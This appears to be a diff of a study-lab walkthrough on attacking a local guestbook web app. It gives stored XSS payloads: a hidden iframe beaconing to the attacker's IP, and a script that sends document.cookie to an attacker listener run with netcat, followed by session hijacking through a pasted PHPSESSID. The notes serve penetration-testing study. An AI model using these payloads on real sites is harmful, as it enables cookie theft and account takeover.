@@ -2,6 +2,7 @@
 
 ##Getting Started
 1. Start XAMPP and apache/mysql
+
 2. Navigate to the host in your webbrowser (should be a guestbook application)
 
 ## XSS
@@ -12,14 +13,21 @@ In this case I posted `<script>alert("XSS");</script>` which when viewed simply 
 XSS can be leveraged to do many things but as an example...
 
 1. Create a comment with an iframe pointing to your ip `<iframe src="http://yo.ur.ip.addr:81/report" width="0" height="0"></iframe>`
+
 2. Setup a listener on your machine `nc -lvp 81` 
+
 3. visit the site from a victims machine and you will see a connection, you can use this to exploit the browser, gather information or grab cookies
 
 **Grabbing Cookies**
+
 1. Submit a comment with the following JS `<script> new Image().src="http://10.11.0.74:81/bogus.php"+document.cookie; </script>`
+
 2. Setup a listener on your machine `nc -lvp 81` 
+
 3. Visit the page as an admin
+
 3. You will see that the cookie has been appended to the url your listener picks up
+
 4. We can steal this cookie and login as the user, edit cookies using your browsers console `document.cookie = "PHPSESSID=34015asdsad08f566d00635a6e8ae98"`
 
 ## Remote File Inclusions
